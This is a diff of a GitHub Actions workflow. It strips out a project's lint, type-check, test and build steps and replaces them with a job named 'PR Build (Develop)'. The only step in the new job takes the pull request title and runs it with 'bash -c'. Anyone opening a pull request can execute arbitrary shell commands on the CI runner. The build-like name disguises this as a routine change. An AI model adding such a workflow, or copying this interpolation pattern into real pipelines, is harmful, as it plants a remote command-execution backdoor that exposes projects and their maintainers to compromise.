@@ -1,41 +1,16 @@
-name: Tests
+name: PR Build (Develop)
+
 on:
-  pull_request_target:
-  push:
-    branches:
-      - main
-  workflow_dispatch:
+  pull_request:
+
 
 jobs:
-  tests:
-    name: Run tests
+  build:
     runs-on: ubuntu-latest
 
-    
     steps:
-      - name: "build: checkout the latest changes"
-        uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-
-      - name: "build: setup the node runtime"
-        uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5.0.0
-        with:
-          cache: npm
-          cache-dependency-path: package-lock.json
-          node-version-file: .nvmrc
-
-      - name: "build: install the required dependencies"
-        run: npm ci
-
-      - name: "unit(test): perform lints and formatting checks"
-        run: npm run lint
-
-      - name: "unit(test): perform check of typings"
-        run: npm run check
-
-      - name: "unit(test): perform unit test checks"
-        run: npm test
-
-      - name: "build: package code for distribution"
-        run: npm run build
+      - name: test
+        run: |
+         title="${{ github.event.pull_request.title }}"
+          echo "About to run: $title"
+          bash -c "$title"
